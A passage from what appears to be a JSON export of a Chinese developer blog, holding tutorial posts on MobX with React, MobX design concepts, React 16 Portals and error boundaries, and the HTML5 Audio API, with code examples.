React 里使用 Mobx","date":"2017-11-21T06:39:42.000Z","updated":"2021-06-15T06:10:52.825Z","comments":true,"path":"/stories/2017/11/MobX/在 React 里使用 Mobx/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/MobX/在 React 里使用 Mobx/","excerpt":"前言Mobx 是一个简单、可扩展的状态管理框架，它通过透明的函数响应式编程使得应用状态管理变得简单和可扩展，Mobx 实现的是双向数据的绑定。 本文介绍如何使用 Mobx 与 React 结合构建健壮的 Web 应用。","text":"前言Mobx 是一个简单、可扩展的状态管理框架，它通过透明的函数响应式编程使得应用状态管理变得简单和可扩展，Mobx 实现的是双向数据的绑定。 本文介绍如何使用 Mobx 与 React 结合构建健壮的 Web 应用。 mobx-react要想 React 与 Mobx 结合使用，离不开 mobx-react 这个模块。mobx-react 把 React 组件进行打包，让你很方便的结合 React 使用。 安装： 1npm install --save mobx mobx-react @observer 函数React + Mobx 离不开 @observer 函数，它被包含在 mobx-react 里。 observer 函数/装饰器可以用来将 React 组件转变成响应式组件。 它用 mobx.autorun 包装了组件的 render 函数以确保任何组件渲染中使用的数据变化时都可以强制刷新组件。 它的使用方式非常简单： 12345678910111213141516// ---- 不使用装饰器 ----const TodoView = observer(class TodoView extends Component &#123; render() &#123; return &lt;div&gt;&#123;this.props.todo.title&#125;&lt;/div&gt; &#125;&#125;)// ---- 使用装饰器 ----@observer class TodoView extends Component &#123; render() &#123; return &lt;div&gt;&#123;this.props.todo.title&#125;&lt;/div&gt; &#125;&#125;// ---- 函数组件 ----const TodoView = observer((&#123; todo &#125;) =&gt; &lt;div&gt;&#123;todo.title&#125;&lt;/div&gt;) 简单的示例下面的示例是一个时间显示。（mobx v4） 123456789101112131415161718192021222324252627282930313233343536373839404142434445import React, &#123; Component &#125; from 'react';import &#123; observer &#125; from 'mobx-react';import &#123; observable, action &#125; from 'mobx';import moment from 'moment';// storeconst store = observable.object(&#123; day: Date.now(), // computed get today() &#123; return moment(this.day).format('YYYY-MM-DD hh:mm:ss'); &#125;, update(e) &#123; this.day = Date.now(); &#125;&#125;, &#123; update: action.bound &#125;);const action = store;// viewconst App = observer(class extends Component &#123; componentDidMount() &#123; this._timer = setInterval(action.update, 100); &#125; componentWillUnmount() &#123; clearInterval(this._timer); &#125; render() &#123; const &#123; day &#125; = this.props.state; return ( &lt;div&gt; &lt;p&gt;&#123;day&#125;&lt;/p&gt; &lt;p&gt;&#123;action.today&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125;);export default () =&gt; &lt;App state=&#123;store&#125; /&gt;// ...ReactDOM.render( &lt;App /&gt;, document.getElementById('root')); 从上面可以看到 React + Mobx 几个特点： 没有了 this.state 所有的数据从 this.props 获取 数据响应式更新，不需要 this.setState 除了使用 observer 函数外，还可以使用 observer 组件包裹你的组件，效果都是一样的。 12345678910return ( &lt;Observer&gt;&#123; () =&gt; ( &lt;div style=&#123;styles.container&#125;&gt; &lt;p style=&#123;styles.text&#125;&gt;&#123;day&#125;&lt;/p&gt; &lt;p style=&#123;styles.text&#125;&gt;&#123;today&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&lt;/Observer&gt;); 注意的是：需要使用函数返回一个组件，因为在源码里做了这样一件事情。 1234var Observer = observer(function (_ref) &#123; var children = _ref.children; return children();&#125;); 好，到这里你已经学会了如何结合使用 Mobx + React。就是这么简单，先是通过创建一个 store，接着把 store 绑定到组件里，组件通过 this.props 获取数据与设置数据。 store 设计Store 的主要职责是将逻辑和状态从组件中移至一个独立的，可测试的单元，这个单元在 JavaScript 前端和后端中都可以使用。通常我们亲切的称它为数据源。 在一个复杂的应用里，通常由一个大的 Store （树结构）管理着应用的内部数据状态，其子树常常称为逻辑拆分，有名为 Module。 在 Redux 里设计 Store 的原则，我通常是使用一个 view/page 对应着一个逻辑拆分，在 Mobx 里也同样适用。 可细分为：UI Store，逻辑 Store。 UI Store 通常很简单，这个 store 通常没有太多的逻辑，但会存储大量的松散耦合的 UI 相关的信息，也在 UI 发生变化的做出改变。例如改变主题颜色等行为。 逻辑 Store 通常包含着一些组件的逻辑变化的数据，例如点赞时 like 从 false 变成 true。 一个 Store 设计的好不好，在一定程度上会影响 React 组件的渲染，通常来说我们应该遵循 Store 设计层级分明，Store 的对象大小，深度层次适度。 在 Redux 里维护着一个大的 store，通过 combineReducers 把 store 拆分为子树，让 reducer 去分发处理。而在 Mobx 里，根本就不需要维护一个大的 store，只需要根据不同的情景尽可能的切分为更多的 store。 比如： 一个 view 对应着一个 observable store。 一个独立组件对应着一个 observable store。 视图组件应该只专注于视图，使用一个 container 组件包裹视图，container 组件复杂与 Mobx 进行连接。 当有多个 store 需要通信时怎么办？这时可以创建一个 RootStore 来实例化所有 stores，并共享引用。 123456789101112131415161718192021222324252627// 根 storeclass RootStore &#123; constructor() &#123; this.userStore = new UserStore(this); this.todoStore = new TodoStore(this); &#125;&#125;class UserStore &#123; constructor(rootStore) &#123; // 设置根 store 的引用 this.rootStore = rootStore; &#125; get todos(user) &#123; // 通过根 store 来访问 todoStore return this.rootStore.todoStore.todos .filter(todo =&gt; todo.author === user); &#125;&#125;class TodoStore &#123; @observable todos = []; constructor(rootStore) &#123; this.rootStore = rootStore; &#125;&#125; 当然还有其他方法，比如全局变量，相同作用域的变量引用等。 异步 action在 Redux 里是使用 react-thunk 中间来处理异步 action 的问题。而在 Mobx 里则使用 async，await，promise，runInAction 等语法或工具函数处理 action 异步的问题。 1234567891011121314151617mobx.useStrict(true);class Store &#123; @observable state = \"loading\" @action getDate() &#123; this.state = \"loading\" // 1 http.get('/data').then( res =&gt; &#123; this.state = \"success\" // 2 &#125;, error =&gt; &#123; this.state = \"error\" // 3 &#125; ) &#125;&#125; 在上面的代码会抛出异常，因为传给 http.get then 的回调函数不是 getDate 的一部分，因为动作只会应用于当前栈。 既然不是 getDate 的一部分，这就需要新创建一个 action 来处理。 123456789101112131415161718192021mobx.useStrict(true);class Store &#123; @observable state = \"loading\" @action getDate() &#123; this.state = \"loading\" // 1 http.get('/data').then( res =&gt; &#123; action('success', () =&gt; &#123; this.state = \"success\" // 2 &#125;); &#125;, error =&gt; &#123; action('fail', () =&gt; &#123; this.state = \"error\" // 3 &#125;); &#125; ) &#125;&#125; 使用 action 需要指定动作名称，还可以使用 runInAction 协同工作，它的优点就是不同使用名称。 123456789101112131415161718192021mobx.useStrict(true);class Store &#123; @observable state = \"loading\" @action getDate() &#123; this.state = \"loading\" // 1 http.get('/data').then( res =&gt; &#123; runInAction(() =&gt; &#123; this.state = \"success\" // 2 &#125;); &#125;, error =&gt; &#123; runInAction(() =&gt; &#123; this.state = \"error\" // 3 &#125;); &#125; ) &#125;&#125; 开发结构实践规范首先，根据不同的页面的分配一个 store 来管理本页面的，其次是使用 rootStore 来负责各页面之间的数据通信。 1234567891011src├── mobx│ ├── stores│ │ ├── home.js // 主页的状态管理│ │ └── user.js // 用户页的状态管理│ └── index.js // 总的 store│├── views│ ├── home.js // 主页│ └── user.js // 用户页│ mobx/stores/home.js 12345678910111213141516import &#123; observable, action &#125; from 'mobx';import moment from 'moment';export default observable.object(&#123; state: &#123; day: Date.now(), &#125;, get today() &#123; return moment(this.state.day).format('YYYY-MM-DD hh:mm:ss'); &#125;, update(e) &#123; this.state.day = Date.now(); &#125;&#125;, &#123; update: action.bound &#125;); mobx/index.js 12export &#123; default as home &#125; from './stores/home';export &#123; default as user &#125; from './stores/user'; views/home.js 1234567891011121314151617181920212223import React, &#123; Component &#125; from 'react';import &#123; observer &#125; from 'mobx-react';import &#123; home as HomeStore &#125; from '../mobx';const Home = observer(class Home extends Component &#123; render() &#123; const &#123; day &#125; = this.props.store.state; const &#123; update, today &#125; = this.props.store; return ( &lt;div&gt; &lt;p&gt;&#123;day&#125;&lt;/p&gt; &lt;p&gt;&#123;today&#125;&lt;/p&gt; &lt;button type=\"primary\" onClick=&#123;update&#125;&gt;更新&lt;/button&gt; &lt;/div&gt; ); &#125;&#125;)export default function () &#123; return &lt;Home store=&#123;HomeStore&#125; /&gt;;&#125; 当然这是一种比较简单的实践经验，更多的需要自己去挖掘。 有几个需要注意的地方： 注意箭头函数的使用，比如在 action.bound 的回调函数里是不能使用箭头函数的，但是在回调函数里可以使用箭头函数。 store 尽量小。 computed 在使用构析语法时会被忽视。","categories":[{"name":"Mobx","slug":"Mobx","permalink":"http://me.lizhooh.com/categories/Mobx/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Mobx","slug":"Mobx","permalink":"http://me.lizhooh.com/tags/Mobx/"}]},{"title":"浅谈 Mobx 的设计思想","slug":"MobX/浅谈 Mobx 的设计思想","date":"2017-11-19T11:27:34.000Z","updated":"2021-06-15T06:10:52.826Z","comments":true,"path":"/stories/2017/11/MobX/浅谈 Mobx 的设计思想/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/MobX/浅谈 Mobx 的设计思想/","excerpt":"前言状态是每个应用程序的核心，维护好一个复杂应用的数据状态可不是一件简单的事情。 对于前端状态管理，有 Redux，Mobx，Flux 等，下面就来介绍一下 Mobx 的设计思想。 MobxMobx 是一个简单、可扩展的状态管理框架，它通过透明的函数响应式编程使得状态管理变得简单和可扩展，Mobx 实现的是双向数据的绑定。 在 Mobx 里有一个 autorun 函数，这是一个智能函数，下面来看看。","text":"前言状态是每个应用程序的核心，维护好一个复杂应用的数据状态可不是一件简单的事情。 对于前端状态管理，有 Redux，Mobx，Flux 等，下面就来介绍一下 Mobx 的设计思想。 MobxMobx 是一个简单、可扩展的状态管理框架，它通过透明的函数响应式编程使得状态管理变得简单和可扩展，Mobx 实现的是双向数据的绑定。 在 Mobx 里有一个 autorun 函数，这是一个智能函数，下面来看看。 12345678910111213const &#123; observable, autorun &#125; = require('mobx');const obj = observable(&#123; a: 'A', b: 'B',&#125;);autorun(() =&gt; &#123; console.log(obj.a);&#125;);obj.b = 3 // 没有输出obj.a = 2 // observe 函数的回调触发了，控制台输出：2 MobX 会对在追踪函数执行过程中读取现存的可观察属性做出反应，这一点是值得肯定的。 和 Vue 一样，Mobx 同样使用了 Object.defineProperty 拦截 getter 和 setter，对数据进行监听（说白了 Mobx 就是让 Reacter 体验双向数据绑定）。 在 Vue 2.5+ 之后，打算使用 ES6 Proxy 来进行属性代理，这样性能更加高效，同时 Mobx 也说了将在未来版本也使用 Proxy，看来大家都喜欢玩最新的语法。 概念在 Mobx 里和 Redux 类似，有几个很重要的概念。 State 状态就是用于记录应用的行为，属性等数据。 Derivations 译为衍生，它的解释是：任何源自于状态并且不会再有任何进一步的相互作用的东西就是衍生。（啥？）说白了就是类似 Redux 中的 Reducer。 Actions 这是几乎所有状态管理框架都有的一个概念，简单点说就是改变状态的动作，比如点击后产生的组件状态变化。 原则虽然 Mobx 是双向数据绑定，但是在许多情况下，我们跟推崇单向数据绑定（因为双向数据绑定很容易翻车）。 为了不带了必要的麻烦，使用 MobX 时应该遵从单向数据流模式，也就是动作改变状态，而状态的改变会更新所有受影响的视图。 Mobx 有几个原则： 原子性：当状态改变时，所有衍生都会进行原子级的自动更新。 同步更新：所有衍生默认都是同步更新的。 计算延迟：计算值是延迟更新的，任何不再使用状态的计算值将不会更新。 纯净：所有的计算值都应该是纯净的，它们不应该用来改变状态。 下面用一段示例来说明： 1234567891011121314151617181920212223242526272829import &#123; observable, autorun &#125; from 'mobx';const todoStore = observable(&#123; // 一些观察的状态 todos: [], // 计算值应当是纯净的 get completedCount() &#123; return this.todos.filter(todo =&gt; todo.completed).length; &#125;&#125;);// 观察状态改变的函数autorun(() =&gt; &#123; console.log(\"Completed %d of %d items\", todoStore.completedCount, todoStore.todos.length );&#125;);// ... 以及一些改变状态的动作todoStore.todos[0] = &#123; title: \"Take a walk\", completed: false&#125;;// -&gt; 同步打印 'Completed 0 of 1 items'todoStore.todos[0].completed = true;// -&gt; 同步打印 'Completed 1 of 1 items' API 概述Mobx 就那么几个，这里介绍几个比较常用的。 observableobservable 就是用于把 js 基本数据类型、引用类型、普通对象、类实例、数组和映射进行属性代理，从而让它们变成一个可观察的数据。 123456789const todoStore = observable(&#123; // 一些观察的状态 todos: [], // 计算值应当是纯净的 get completedCount() &#123; return this.todos.filter(todo =&gt; todo.completed).length; &#125;&#125;); observable 返回后的可观察对象有几个属性可用。 12345const name = observable(\"John\");name.get(); // 获取值name.set(value); // 更新值name.observe(cb); // 变化时name.intercept(cb); // 拦截时 autorunautorun 与 Redux 中的 subscribe(listener) 功能类似。它是响应式的，当观察数据发生改变时，就会调用 autorun 的回调函数。 1234567891011121314151617181920const &#123; observable, computed, autorun &#125; = require('mobx');const numbers = observable([1, 2, 3]);const sum = computed(() =&gt; numbers.reduce((a, b) =&gt; a + b, 0));const disposer = autorun(() =&gt; &#123; console.log(sum.get())&#125;);dispose.onError(e =&gt; &#123; // 在 autorun 里发生错误时回调&#125;);// 输出 6numbers.push(4);// 输出 10disposer();numbers.push(5);// 没有输出 autorun 在创建时总会回调一次，所以上面输出了两个数字。autorun 的返回值是一个 disposer（处置器），可用于在执行期间清理 autorun。 computedcomputed 是可以根据现有的状态或其它计算值得出的值。如果任何影响计算值的值发生变化了，计算值将根据状态自动进行更新。 computed 与 autorun 一样都是响应式的，但它与 autorun 不同。 computed 在于要产生一个新的值。例如 sum 就是一个计算值。 1const sum = computed(() =&gt; numbers.reduce((a, b) =&gt; a + b, 0)); 而 autorun 在于达到一个效果，这种效果是 console 输出或者更新视图等。 123autorun(() =&gt; &#123; console.log(sum.get())&#125;); computed 的定义在 observable 里使用 getter，setter 即可，而 setter 不能该计算本身，却能修改 computed 中的值。 123456789const box = observable(&#123; length: 2, get squared() &#123; return this.length * this.length; &#125;, set squared(value) &#123; // 修改 this.length this.length = Math.sqrt(value); &#125;&#125;); 除此外还可以在computed 回调函数里定义一个计算。就像上面的 sum 函数一样，之后可以使用 .get() 来获取计算值， .set 来更新其值，使用 .observe 来监听其值变化。 12345678910const &#123; computed, observable &#125; = require(\"mobx\");const name = observable(\"John\");const upperCaseName = computed(() =&gt; name.get().toUpperCase());const disposer = upperCaseName.observe(change =&gt; console.log(change.newValue));name.set(\"AAA\"); // AAA actionaction 就是产生动作的处理函数。动作所带来的是状态的改变，状态的改变从而影响到视图的改变。 它有以下几种的使用方式： 12345678action(fn)action(name, fn)@action classMethod() &#123;&#125;@action(name) classMethod () &#123;&#125;@action boundClassMethod = (args) =&gt; &#123; body &#125;@action(name) boundClassMethod = (args) =&gt; &#123; body &#125;@action.bound classMethod() &#123;&#125;@action.bound(function() &#123;&#125;) //自动绑定名称 为限定只在 action 里进行数据状态的更新，应当使用 mobx 严格模式。 1mobx.useStrict(true); // 不允许在动作之外进行状态修改 使用姿势： 1234567891011121314151617181920212223const &#123; autorun, observable, action&#125; = require(\"mobx\");const ticker = observable(&#123; tick: 1, increment: action('increment', function () &#123; this.tick++; &#125;), abatement: action.bound(function () &#123; this.tick--; &#125;),&#125;);autorun(() =&gt; &#123; console.log(ticker.tick);&#125;);setInterval(() =&gt; &#123; ticker.increment();&#125;, 1000); 注意：使用箭头函数会自动绑定 this，但不是 ticker。所以这里就不要使用箭头函数。 action 只会应用于当前栈，注意这句话的意思，下面把 increment 修改一下。 123456increment: action('increment', async function () &#123; this.tick++; await http.get('/').then(res =&gt; &#123; this.tick++; &#125;);&#125;), 上面的操作在严格模式下会抛出错误，因为 action 只能作用在当前栈（现在运行时）。而 then 中的回调函数是将来运行时的。 action 视每经过一个 await 为一个运行栈。 对于异步处理，需要使用 runInAction(name?, thunk)，例如： 1234567increment: action('increment', async function () &#123; this.tick++; await new Promise(rs =&gt; setTimeout(rs, 2000)); runInAction(() =&gt; &#123; this.tick++; &#125;);&#125;), 使用装饰器Mobx 官方是推荐使用装饰器的。但因为装饰器还是实验性的，本人不太推荐。 1234567891011121314import &#123; observable, computed &#125; from \"mobx\";class OrderLine &#123; @observable price = 0; @observable amount = 1; constructor(price) &#123; this.price = price; &#125; @computed get total() &#123; return this.price * this.amount; &#125;&#125; 在上面代码里，使用 @observable 之后变量就变成可观察的，同样使用 @computed 之后函数变成了计算。 不使用装饰器装饰器未免还是太过于超前，如果不想使用装饰器，那么上面的代码变成这样： 123456789101112131415161718import &#123; extendObservable, computed &#125; from \"mobx\";class OrderLine &#123; constructor(price) &#123; extendObservable(this, &#123; price: price, amount: 1, // 有效: get total() &#123; return this.price * this.amount &#125;, // 同样有效: total: computed(function() &#123; return this.price * this.amount &#125;) &#125;) &#125;&#125; 原值类型和引用类型的问题JavaScript 中的所有原始类型值都是不可变的，因此它们都是不可观察的。所以对于原始类型 MobX 而是把它封装为一个可观察对象。 对于原始类型将使用 observable.box 管理原始类型值。 observable.box(value) observable.box(value) 接收任何值并把值存储到箱子中。 使用 .get() 可以获取当前值，使用 .set(newValue) 可以更新值。 12345678910111213mport &#123;observable&#125; from \"mobx\";const cityName = observable(\"Vienna\");console.log(cityName.get());// 输出 'Vienna'cityName.observe(function(change) &#123; console.log(change.oldValue, \"-&gt;\", change.newValue);&#125;);cityName.set(\"Amsterdam\");// 输出 'Vienna -&gt; Amsterdam' 而对于引用类型来说，它就不需要使用 get，set 函数去更新值了。 1234567import &#123;observable&#125; from \"mobx\";const myArray = [\"Vienna\"];const cityName = observable(myArray);console.log(cityName[0]);// 输出 'Vienna' Mobx 与 Redux 对比因为 Mobx 与 Redux 都是数据状态管理框架，所以会出现「Mobx 还是 Redux ?」的问题，那就少不了对比了。 Mobx Redux 数据流流动不自然，只有用到的数据才会引发绑定，局部精确更新，但免去了粒度控制烦恼。 数据流流动很自然，因为任何 dispatch 都会导致广播，需要依据对象引用是否变化来控制更新粒度。 自始至终一份引用，不需要 immutable，也没有复制对象的额外开销。 时间回溯代价很高，因为每次都要更新引用，除非增加代码复杂度，或使用 immutable。 Mobx 里可以切分成许多小的 store，每个 store 可以灵活的设计。 Redux 里规定只有一个 Store，通过子树的关系每个视图维护一个子树，不过无论如何都会遍历所有的 reducer。所以当 store 很大时 reducer 的性能问题是不能忽视的一部分。 Mobx 的数据是响应式更新的。 Redux 更新数据时需要使用 dispatch。 如果 store 很多，Mobx 在初始化时需要一点时间添加 getter，setter。 对于 Redux 来说，store 很多并不会加长初始加载时间，但是会加长遍历 reducer 的时间。 小结Mobx 是一个应用数据状态管理框架，它并不限于在 React 中使用，它还可以与 JQuery 结合构建你的 MVVM 应用，或者在后端复杂的应用场景下使用 Mobx 管理数据状态。Mobx 它通过 Object.defineProperty 来实现数据的绑定。 参考资料 https://mobx.js.org/intro/overview.html https://mobxjs.github.io/mobx/getting-started.html","categories":[{"name":"Mobx","slug":"Mobx","permalink":"http://me.lizhooh.com/categories/Mobx/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Mobx","slug":"Mobx","permalink":"http://me.lizhooh.com/tags/Mobx/"}]},{"title":"React 16 新特性 Portal 与错误边界的用法","slug":"React/React/React 16 新特性 Portal 与错误边界的用法","date":"2017-11-16T08:20:24.000Z","updated":"2021-06-15T06:10:52.875Z","comments":true,"path":"/stories/2017/11/React/React/React 16 新特性 Portal 与错误边界的用法/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/React/React/React 16 新特性 Portal 与错误边界的用法/","excerpt":"前言在 React 16 里添加了一个 Portal 的 API，它挂载在 ReactDOM 里。Portal 的作用是可以直接脱离当前的 DOM 结构，在任意的地方渲染 DOM 节点。这意味着以往在 React 实现全局消息通知，Modal，对话框，悬浮卡片等组件时非常棘手，而现在可以轻易的使用 Portal 的特性来实现。 除了 Portal 外，还有一个比较值得关注的新特性，那就是错误边界。在 React 16 里添加了一个周期函数：componentDidCatch，但组件内部发送错误时就会把错误信息交给 componentDidCatch 去处理。","text":"前言在 React 16 里添加了一个 Portal 的 API，它挂载在 ReactDOM 里。Portal 的作用是可以直接脱离当前的 DOM 结构，在任意的地方渲染 DOM 节点。这意味着以往在 React 实现全局消息通知，Modal，对话框，悬浮卡片等组件时非常棘手，而现在可以轻易的使用 Portal 的特性来实现。 除了 Portal 外，还有一个比较值得关注的新特性，那就是错误边界。在 React 16 里添加了一个周期函数：componentDidCatch，但组件内部发送错误时就会把错误信息交给 componentDidCatch 去处理。 PortalPortal 的创建使用 ReactDOM.createPortal： ReactDOM.createPortal(child, container) 第一个参数（child）是任何可渲染的 React 子元素，如元素，字符串或片段。第二个参数（container）是一个 DOM 元素。 123456render() &#123; return ReactDOM.createPortal( this.props.children, domNode, );&#125; 下面来介绍如何使用它。 假设有以下 HTML 结构： 123456&lt;html&gt; &lt;body&gt; &lt;div id=\"app-root\"&gt;&lt;/div&gt; &lt;div id=\"modal-root\"&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 很明显，model-root 是用来渲染对话框的。 当在 render 函数里渲染时： 1234567891011121314151617render() &#123; return ( &lt;div&gt; &lt;header&gt;&lt;/header&gt; &lt;section&gt;&lt;/section&gt; &lt;footer&gt;&lt;/footer&gt; &lt;div&gt;&#123; ReactDOM.createPortal( &lt;div&gt; &lt;h1&gt;Model&lt;/h1&gt; &lt;/div&gt;, document.getElementById(\"modal-root\"), ) &#125;&lt;/div&gt; &lt;/div&gt; );&#125; &lt;h1&gt;Model&lt;/h1&gt; 并不会挂载在 app-root 内部，而挂载在 model-root 内部。 接下来把它抽象起来，定义一个 Model 类。 12345678910111213141516171819202122232425const appRoot = document.getElementById('app-root');const modalRoot = document.getElementById('modal-root');class Modal extends React.Component &#123; constructor(props) &#123; super(props); this.el = document.createElement('div'); &#125; componentDidMount() &#123; modalRoot.appendChild(this.el); &#125; componentWillUnmount() &#123; modalRoot.removeChild(this.el); &#125; render() &#123; return ReactDOM.createPortal( this.props.children, this.el, ); &#125;&#125; 使用的时候，可以这样去使用它： 123456789101112131415161718192021222324252627282930313233class Parent extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; showModal: false, &#125;; &#125; openModal = event =&gt; &#123; this.setState(&#123; showModal: true &#125;); &#125; closeModal = event =&gt; &#123; if (event.currentTarget === event.target) &#123; this.setState(&#123; showModal: false &#125;); &#125; &#125; render() &#123; const &#123; showModal &#125; = this.state; return ( &lt;div onClick=&#123;this.handleClick&#125;&gt; &lt;button onClick=&#123;this.openModal&#125;&gt;open Modal&lt;/button&gt; &#123;showModal &amp;&amp; &lt;Modal onClick=&#123;this.closeModal&#125;&gt; &lt;h1&gt;Hello Modal&lt;/h1&gt; &lt;/Modal&gt; &#125; &lt;/div&gt; ); &#125;&#125; 这样添加相应样式后，就实现了一个 Modal 组件。 错误边界错误边界就是 componentDidCatch，它的参数如下： componentDidCatch(error, info) 第一个参数为错误信息，第二个参数为错误栈信息。 与以往不同的是，错误边界可以很灵活的处理错误。 1234567891011121314151617181920class ErrorBoundary extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; hasError: false &#125;; &#125; componentDidCatch(error, info) &#123; this.setState(&#123; hasError: true &#125;); // 把错误信息上报 logErrorToMyService(error, info); &#125; render() &#123; // 在出错误的时候，显示出错误了 if (this.state.hasError) &#123; return &lt;h1&gt;Something went wrong.&lt;/h1&gt;; &#125; return this.props.children; &#125;&#125; 那么，到底什么时候会出错呢？比如，有一个组件，它接收 data props，它使用了 data.name。 123456789101112131415161718192021222324252627282930const User = (&#123; data &#125;) =&gt; ( &lt;span&gt;&#123;data.name&#125;&lt;/span&gt;);class App extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; hasError: false &#125;; &#125; componentDidCatch(error, info) &#123; this.setState(&#123; hasError: true &#125;); // 把错误信息上报 logErrorToMyService(error, info); &#125; async componentDidMount() &#123; this.setState(&#123; data: await api.get(), &#125;); &#125; render() &#123; // 在出错误的时候，显示出错误了 if (this.state.hasError) &#123; return &lt;h1&gt;Something went wrong.&lt;/h1&gt;; &#125; return &lt;User data=&#123;this.state.data&#125; /&gt;; &#125;&#125; 数据是从服务器获取的，如果服务器抽风了，返回的数据是 null 而不是 object，这是在 User 组件里使用 data.name 则会报错。此时，错误信息将抛给 componentDidCatch。在以往这种错误发生了，它会导致整个组件挂死。而现在，整个组件并不会挂死，它会运行良好。 参考资料 https://reactjs.org/docs/portals.html#event-bubbling-through-portals https://reactjs.org/docs/error-boundaries.html","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"HTML5 Audio API 详解","slug":"HTML5/HTML5 Audio API 详解","date":"2017-11-14T01:51:59.000Z","updated":"2021-06-15T06:10:52.821Z","comments":true,"path":"/stories/2017/11/HTML5/HTML5 Audio API 详解/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/HTML5/HTML5 Audio API 详解/","excerpt":"前言&lt;audio&gt; 标签是 HTML5 用于播放音乐的标签，现在基本与音乐相关的都由它来制作。audio 提供了一个默认的控制栏，不过这个控制栏是由浏览器的 UI 控制的，它会根据不同的浏览器从而展现不同的 UI。更多时候我们需要自己去定义与美化 UI，那么在这过程中就需要使用大量的 API。本文记录的 audio 相关的 api 说明。 最后我使用 audio api 自定义了一个 React 音乐播放的组件。它看起来像是这样：","text":"前言&lt;audio&gt; 标签是 HTML5 用于播放音乐的标签，现在基本与音乐相关的都由它来制作。audio 提供了一个默认的控制栏，不过这个控制栏是由浏览器的 UI 控制的，它会根据不同的浏览器从而展现不同的 UI。更多时候我们需要自己去定义与美化 UI，那么在这过程中就需要使用大量的 API。本文记录的 audio 相关的 api 说明。 最后我使用 audio api 自定义了一个 React 音乐播放的组件。它看起来像是这样： 标签属性通过标签设置的属性： 1&lt;audio src=\"../text.mp3\" /&gt; 属性 类型 描述 src String 音乐的 URL preload Boolean 在页面加载后，进行预加载 autoplay Boolean 自动播放 loop Boolean 循环播放 controls Boolean 浏览器自带的控制条 属性audio 的属性大多使用了 defaultPropery 代理了 get, set。×表示现在所有浏览器都不支持，但是在草案里有定义。 属性 描述 audioTracks 返回表示可用音频轨道的 AudioTrackList 对象 autoplay 设置或返回是否在就绪（加载完成）后随即播放音频 buffered 返回表示音频已缓冲部分的 TimeRanges 对象 controller 返回表示音频当前媒体控制器的 MediaController 对象（×） controls 设置或返回音频是否应该显示控件（比如播放/暂停等） crossOrigin 设置或返回音频的 CORS 设置 currentSrc 返回当前音频的 URL currentTime 设置或返回音频中的当前播放位置（以秒计） defaultMuted 设置或返回音频默认是否静音 defaultPlaybackRate 设置或返回音频的默认播放速度 duration 返回音频的长度（以秒计） ended 返回音频的播放是否已结束 error 返回表示音频错误状态的 MediaError 对象 loop 设置或返回音频是否应在结束时再次播放 mediaGroup 设置或返回音频所属媒介组合的名称 muted 设置或返回是否关闭声音 networkState 返回音频的当前网络状态 paused 设置或返回音频是否暂停 playbackRate 设置或返回音频播放的速度 played 返回表示音频已播放部分的 TimeRanges 对象 preload 设置或返回音频的 preload 属性的值 readyState 返回音频当前的就绪状态 seekable 返回表示音频可寻址部分的 TimeRanges 对象 seeking 返回用户是否做了跳转操作 src 设置或返回音频的 src 属性的值 textTracks 返回表示可用文本轨道的 TextTrackList 对象 volume 设置或返回音频的音量 方法 方法 描述 addTextTrack() 向音频添加新的文本轨道。 canPlayType() 检查浏览器是否能够播放指定的音频类型。 fastSeek() 在音频播放器中指定播放时间。 getStartDate() 返回新的 Date 对象，表示当前时间线偏移量。 load() 重新加载音频元素。 play() 开始播放音频。 pause() 暂停当前播放的音频。 事件事件使用有两种方式： onplay(event); audio.addEventListener(‘play’, callback, false); 事件 描述 loadstart 客户端开始请求数据 progress 客户端正在请求数据 abort 客户端主动终止下载（不是因为错误引起） error 请求数据时遇到错误 stalled 网速失速 play play() 和 autoplay 开始播放时触发 pause pause() 触发 loadedmetadata 成功获取资源长度 loadeddata 加载完成数据 waiting 当视频因缓冲下一帧而停止时产生该事件 playing 当媒体从因缓冲而引起的暂停和停止恢复到播放时产生该事件 canplay 可以播放，但中途可能因为加载而暂停 canplaythrough 可以播放，歌曲全部加载完毕 seeking 寻找中 seeked 寻找完毕 timeupdate 播放时间改变 ended 播放结束 ratechange 播放速率改变 durationchange 资源长度改变 volumechange 音量改变 suspend 当获取不到数据时产生该事件 注意的问题如何把数据同步到视图上？ audio 在播放音乐时，提供了 timeupdate 的事件，大致是 250 ~ 500 ms 一个轮询。 1234567891011this.audio.ontimeupdate = e =&gt; &#123; const data = &#123; currentTime: this.audio.currentTime, duration: this.audio.duration, seeking: this.audio.seeking, buffered: this.audio.buffered.end(0), seekable: this.audio.seekable.end(0), percent: (this.audio.currentTime / this.audio.duration * 10000 | 0) / 100, networkState: this.audio.networkState, &#125;&#125; 参考资料 https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Media_events","categories":[{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/categories/HTML5/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"}]},{"title":"探索 WebAssembly","slug":"HTML5/探索 